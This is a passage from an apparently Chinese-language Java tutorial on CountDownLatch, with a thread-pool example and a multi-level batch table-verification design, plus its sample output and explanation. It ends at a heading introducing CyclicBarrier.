            executorService<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SimpleRunnable</span><span class="token punctuation">(</span>latch<span class="token punctuation">,</span> count<span class="token punctuation">,</span> i<span class="token punctuation">,</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"All works submitted.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        latch<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        executorService<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// step3</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"All works finished. Support with [%d] threads.\n"</span><span class="token punctuation">,</span> count<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">SimpleRunnable</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> index<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> param<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">CountDownLatch</span> latch<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">AtomicInteger</span> count<span class="token punctuation">;</span>

        <span class="token class-name">SimpleRunnable</span><span class="token punctuation">(</span><span class="token class-name">CountDownLatch</span> latch<span class="token punctuation">,</span> <span class="token class-name">AtomicInteger</span> count<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span> param<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>index <span class="token operator">=</span> index<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>param <span class="token operator">=</span> param<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>count <span class="token operator">=</span> count<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>latch <span class="token operator">=</span> latch<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s deal with [%d]-[%d] \n"</span><span class="token punctuation">,</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> index<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
                count<span class="token punctuation">.</span><span class="token function">incrementAndGet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                latch<span class="token punctuation">.</span><span class="token function">countDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">All</span> works submitted<span class="token punctuation">.</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">2</span> deal <span class="token keyword">with</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token number">546</span><span class="token punctuation">]</span> 
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">1</span> deal <span class="token keyword">with</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token number">833</span><span class="token punctuation">]</span> 
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">2</span> deal <span class="token keyword">with</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> 
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">1</span> deal <span class="token keyword">with</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token number">247</span><span class="token punctuation">]</span> 
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">2</span> deal <span class="token keyword">with</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token number">191</span><span class="token punctuation">]</span> 
<span class="token class-name">All</span> works <span class="token class-name"><span class="token namespace">finished<span class="token punctuation">.</span></span> Support</span> <span class="token keyword">with</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> threads<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="任务拆分离散并行化处理">任务拆分离散并行化处理</h3>
<p>业务流程如下</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/CountDown.drawio-1667231117133-87.png" alt="CountDown.drawio"></p>
<h4 id="基本信息定义">基本信息定义</h4>
<ul>
<li>统计表</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Getter</span>
<span class="token annotation punctuation">@Setter</span>
<span class="token keyword">class</span> <span class="token class-name">Table</span> <span class="token punctuation">{</span>
    <span class="token comment">// 表名</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> tableName<span class="token punctuation">;</span>
    <span class="token comment">// 原始记录条数</span>
    <span class="token keyword">private</span> <span class="token keyword">long</span> sourceRecordCount <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token comment">// 传输完成后的记录条数：验证1</span>
    <span class="token keyword">private</span> <span class="token keyword">long</span> targetCount<span class="token punctuation">;</span>
    <span class="token comment">// 原始schema</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> sourceColumnSchema <span class="token operator">=</span> <span class="token string">"&lt;table name='a'&gt;&lt;column name='c1' type='varchar'&gt;&lt;/column&gt;&lt;/table&gt;"</span><span class="token punctuation">;</span>
    <span class="token comment">// 传输完成之后的schema：验证2</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> targetColumnSchema <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">Table</span><span class="token punctuation">(</span><span class="token class-name">String</span> tableName<span class="token punctuation">,</span> <span class="token keyword">long</span> sourceRecordCount<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>tableName <span class="token operator">=</span> tableName<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>sourceRecordCount <span class="token operator">=</span> sourceRecordCount<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>监控工具</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Watcher</span> <span class="token punctuation">{</span>
    <span class="token keyword">final</span> <span class="token class-name">CountDownLatch</span> countDownLatch<span class="token punctuation">;</span>

    <span class="token class-name">Watcher</span><span class="token punctuation">(</span><span class="token class-name">CountDownLatch</span> countDownLatch<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>countDownLatch <span class="token operator">=</span> countDownLatch<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>事件定义（对应一次批处理任务）</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Getter</span>
<span class="token annotation punctuation">@Setter</span>
<span class="token keyword">class</span> <span class="token class-name">Event</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> eventName<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">Event</span><span class="token punctuation">(</span><span class="token class-name">String</span> eventName<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>eventName <span class="token operator">=</span> eventName<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>批处理任务完成验证</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EventTaskBatch</span> <span class="token keyword">extends</span> <span class="token class-name">Watcher</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Event</span> event<span class="token punctuation">;</span>

    <span class="token class-name">EventTaskBatch</span><span class="token punctuation">(</span><span class="token class-name">Event</span> event<span class="token punctuation">,</span> <span class="token keyword">int</span> taskSize<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CountDownLatch</span><span class="token punctuation">(</span>taskSize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>event <span class="token operator">=</span> event<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">void</span> <span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        countDownLatch<span class="token punctuation">.</span><span class="token function">countDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>countDownLatch<span class="token punctuation">.</span><span class="token function">getCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// Event涉及到的所有Table任务完成</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"All table of event "</span> <span class="token operator">+</span> event<span class="token punctuation">.</span><span class="token function">getEventName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" is finished verify and update continue."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>批处理表验证任务全部完成</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">TableTaskBatch</span> <span class="token keyword">extends</span> <span class="token class-name">Watcher</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Table</span> table<span class="token punctuation">;</span>

    <span class="token comment">/* 每张表存在多个验证任务 */</span>
    <span class="token keyword">private</span> <span class="token class-name">EventTaskBatch</span> eventTaskBatch<span class="token punctuation">;</span>

    <span class="token class-name">TableTaskBatch</span><span class="token punctuation">(</span><span class="token class-name">EventTaskBatch</span> eventTaskBatch<span class="token punctuation">,</span> <span class="token class-name">Table</span> table<span class="token punctuation">,</span> <span class="token keyword">int</span> taskSize<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CountDownLatch</span><span class="token punctuation">(</span>taskSize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>table <span class="token operator">=</span> table<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>eventTaskBatch <span class="token operator">=</span> eventTaskBatch<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        countDownLatch<span class="token punctuation">.</span><span class="token function">countDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>countDownLatch<span class="token punctuation">.</span><span class="token function">getCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// Table相关所有任务完成</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"All tasks of "</span> <span class="token operator">+</span> table<span class="token punctuation">.</span><span class="token function">getTableName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" is finished verify and update continue."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            eventTaskBatch<span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>表数据验证行为</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">TableVerify</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>

    <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">Table</span> table<span class="token punctuation">;</span>

    <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">TableTaskBatch</span> tableTaskBatch<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">TableVerify</span><span class="token punctuation">(</span><span class="token class-name">Table</span> table<span class="token punctuation">,</span> <span class="token class-name">TableTaskBatch</span> tableTaskBatch<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>table <span class="token operator">=</span> table<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>tableTaskBatch <span class="token operator">=</span> tableTaskBatch<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​		a) 验证1：验证数据量</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">TrustSourceRecordCount</span> <span class="token keyword">extends</span> <span class="token class-name">TableVerify</span><span class="token punctuation">{</span>
    <span class="token class-name">TrustSourceRecordCount</span><span class="token punctuation">(</span><span class="token class-name">Table</span> table<span class="token punctuation">,</span> <span class="token class-name">TableTaskBatch</span> tableTaskBatch<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span>table<span class="token punctuation">,</span> tableTaskBatch<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spend</span><span class="token punctuation">(</span><span class="token class-name">ThreadLocalRandom</span><span class="token punctuation">.</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 设置传输完成之后的数据量</span>
        table<span class="token punctuation">.</span><span class="token function">setTargetCount</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span><span class="token function">getSourceRecordCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 完成一次一张表的验证完成计数</span>
        tableTaskBatch<span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​		b) 验证2：验证表结构</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">TrustSourceColumns</span> <span class="token keyword">extends</span> <span class="token class-name">TableVerify</span> <span class="token punctuation">{</span>
    <span class="token class-name">TrustSourceColumns</span><span class="token punctuation">(</span><span class="token class-name">Table</span> table<span class="token punctuation">,</span> <span class="token class-name">TableTaskBatch</span> tableTaskBatch<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span>table<span class="token punctuation">,</span> tableTaskBatch<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spend</span><span class="token punctuation">(</span><span class="token class-name">ThreadLocalRandom</span><span class="token punctuation">.</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        table<span class="token punctuation">.</span><span class="token function">setTargetColumnSchema</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span><span class="token function">getSourceColumnSchema</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 完成一次一张表的验证完成计数</span>
        tableTaskBatch<span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>测试类</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CountDownLatchTest</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">ExecutorService</span> executorService <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newFixedThreadPool</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token comment">// 不同数据源的数据，批处理</span>
            <span class="token class-name">Event</span><span class="token punctuation">[</span><span class="token punctuation">]</span> events <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token class-name">Event</span><span class="token punctuation">(</span><span class="token string">"Event-1"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Event</span><span class="token punctuation">(</span><span class="token string">"Event-2"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Event</span> event <span class="token operator">:</span> events<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// 获取数据源表资源概况</span>
                <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Table</span><span class="token punctuation">&gt;</span></span> tables <span class="token operator">=</span> <span class="token function">capture</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">EventTaskBatch</span> eventTaskBatch <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventTaskBatch</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> tables<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Table</span> table <span class="token operator">:</span> tables<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token comment">// 与Table相关的任务技术监控。</span>
                    <span class="token class-name">TableTaskBatch</span> tableTaskBatch <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TableTaskBatch</span><span class="token punctuation">(</span>eventTaskBatch<span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    executorService<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TrustSourceRecordCount</span><span class="token punctuation">(</span>table<span class="token punctuation">,</span> tableTaskBatch<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    executorService<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TrustSourceColumns</span><span class="token punctuation">(</span>table<span class="token punctuation">,</span> tableTaskBatch<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
            executorService<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Table</span><span class="token punctuation">&gt;</span></span> <span class="token function">capture</span><span class="token punctuation">(</span><span class="token class-name">Event</span> event<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Table</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Table</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span><span class="token function">getEventName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"-Table-"</span> <span class="token operator">+</span> i<span class="token punctuation">,</span> i <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> list<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>测试结果</p>
<pre class="line-numbers language-none"><code class="language-none">All tasks of Event-1-Table-3 is finished verify and update continue.
All tasks of Event-1-Table-1 is finished verify and update continue.
All tasks of Event-1-Table-4 is finished verify and update continue.
All tasks of Event-1-Table-6 is finished verify and update continue.
All tasks of Event-1-Table-5 is finished verify and update continue.
All tasks of Event-1-Table-2 is finished verify and update continue.
All tasks of Event-1-Table-0 is finished verify and update continue.
All tasks of Event-1-Table-7 is finished verify and update continue.
All tasks of Event-1-Table-8 is finished verify and update continue.
All tasks of Event-2-Table-4 is finished verify and update continue.
All tasks of Event-2-Table-2 is finished verify and update continue.
All tasks of Event-2-Table-6 is finished verify and update continue.
All tasks of Event-2-Table-3 is finished verify and update continue.
All tasks of Event-2-Table-0 is finished verify and update continue.
All tasks of Event-1-Table-9 is finished verify and update continue.
All table of event Event-1 is finished verify and update continue.

All tasks of Event-2-Table-1 is finished verify and update continue.
All tasks of Event-2-Table-7 is finished verify and update continue.
All tasks of Event-2-Table-9 is finished verify and update continue.
All tasks of Event-2-Table-8 is finished verify and update continue.
All tasks of Event-2-Table-5 is finished verify and update continue.
All table of event Event-2 is finished verify and update continue.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>结果分析</p>
<ol>
<li>每个<strong>table</strong>的所有验证完成，执行<code>TableTaskBatch</code>的<code>done</code>中的后续操作</li>
<li>每个<strong>event</strong>的所有<strong>table</strong>的验证完成，执行<code>EventTaskBatch</code>的<code>done</code>中的后续操作</li>
</ol>
<h1>CyclicBarrier</h1>
